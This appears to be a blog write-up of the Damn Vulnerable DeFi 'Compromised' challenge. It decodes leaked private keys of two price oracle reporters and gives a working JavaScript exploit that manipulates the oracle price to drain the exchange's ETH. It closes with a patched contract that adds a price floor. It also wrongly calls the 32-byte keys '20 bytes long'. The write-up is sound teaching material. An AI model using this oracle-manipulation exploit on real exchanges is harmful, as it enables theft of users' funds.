---
layout: post
title: Damn Vulnerable DeFi - Compromised
---

## Description
While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:

```
          HTTP/2 200 OK
          content-type: text/html
          content-language: en
          vary: Accept-Encoding
          server: cloudflare

          4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

          4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each

This price is fetched from an on-chain oracle, and is based on three trusted reporters: 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.

Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

## Solution
Oracles are an attack vector, whether we like it or not. By integrating an oracle into our
contract we are TRUSTING that the oracle behaves. If the oracle becomes compromised
then an attacker can use the oracle's bad pricing to manipulate variabels in our contract.

In this challenge, what would happen if we gained access to the trustful oracle's private keys?
We could set any price we want on the exchange and buy those damn valuable nft's for dirt cheap.

Upon seeing the server snippet, my immediate thought is that its a list of private keys. But how do we decode it? What kind of data is it? The first hint is that characters
come in two's and their range is 0-f. This is hex byte data! If we plug the server response into a
hex to utf-8 decoder here's what we get

```
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5

MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

Now this isn't necesarrily obvious, but this output looks like a valid base64 encoded string. I wouldn't expect you to know this unless you've seen base64 encoded strings before. That's what makes this challenge hard. Unless you've seen hex byte data and base64 encodings before, it's unlikely you'd be able to recognized them.

Now if we plug the base64 encoded strings into a base64 decoder we get

```
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

20 bytes long! Those are private keys! It looks like we have the private keys
of 2/3 trusted sources. With a majority, we can take over the oracle's pricing. Here are the steps
to steal the NFTs

1. Using our two trusted source addresses, post a price of 0 to the oracle
2. Buy the NFT
3. Using our two trusted source addresses, post the max price to the oracle
4. Sell the NFT (profits!!!)
5. Using our two trusted source addresses, set the price back to the original price

We can do this all in Javascript

```
it('Exploit', async function () {        
    /** CODE YOUR EXPLOIT HERE */
    // 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
    const trustedSource1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
    // 0x81A5D6E50C214044bE44cA0CB057fe119097850c
    const trustedSource2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
    trustedSource2.connect(ethers.provider)

    // Set price to 0 and buy
    await this.oracle.connect(trustedSource1).postPrice("DVNFT", 0);
    await this.oracle.connect(trustedSource2).postPrice("DVNFT", 0);
    await this.exchange.connect(attacker).buyOne({value: ethers.BigNumber.from("1")})

    // Set price to max and sell
    const maxPrice = await ethers.provider.getBalance(this.exchange.address)
    await this.oracle.connect(trustedSource1).postPrice("DVNFT", maxPrice)
    await this.oracle.connect(trustedSource2).postPrice("DVNFT", maxPrice)
    await this.nftToken.connect(attacker).approve(this.exchange.address, "0")
    await this.exchange.connect(attacker).sellOne(ethers.BigNumber.from("0"))

    // Set price back to original
    await this.oracle.connect(trustedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE)
    await this.oracle.connect(trustedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE)
});
```

## Patched Contract
Ideally we shouldn't use oracles at all. But if we must, there are several ways to mitigate against an unexpected change in oracle prices. Notice I say _mitigate_, not _prevent_, because we can never 100% eliminate the trust element in using oracles. Here are two strategies that come to mind
1. Set our own price floor. If the orcale is reporting a price lower than the price floor we'll use the price floor instead.
2. Use the average of the last N reported oracle prices and restrict the exchange to 1 purchase per block. In this scenario an attacker could still drive the price down to 0. But it would take much longer and may give time for the exchange to realize the trusted keys have been compromised.

Here's an example of approach 1. While still exploitable, it reduces the attacker's maximum profits

```
contract ExchangeV2 is ReentrancyGuard {

    using Address for address payable;

    // Minimum price is 10% of the initial price
    uint256 constant MIN_PRICE = 100 ether;

    DamnValuableNFT public immutable token;
    TrustfulOracle public immutable oracle;

    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);

    constructor(address oracleAddress) payable {
        token = new DamnValuableNFT();
        oracle = TrustfulOracle(oracleAddress);
    }

    function buyOne() external payable nonReentrant returns (uint256) {
        uint256 amountPaidInWei = msg.value;
        require(amountPaidInWei > 0, "Amount paid must be greater than zero");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = getMinPrice(oracle.getMedianPrice(token.symbol()));
        require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");

        uint256 tokenId = token.safeMint(msg.sender);
        
        payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);

        emit TokenBought(msg.sender, tokenId, currentPriceInWei);

        return tokenId;
    }

    // The minimum price SHOULD NOT be under MIN_PRICE
    function getMinPrice(uint256 oraclePrice) internal pure returns (uint256) {
        if (oraclePrice < MIN_PRICE)
            return MIN_PRICE;
        return oraclePrice;
    }

    function sellOne(uint256 tokenId) external nonReentrant {
        require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
        require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");

        token.transferFrom(msg.sender, address(this), tokenId);
        token.burn(tokenId);
        
        payable(msg.sender).sendValue(currentPriceInWei);

        emit TokenSold(msg.sender, tokenId, currentPriceInWei);
    }

    receive() external payable {}
}
```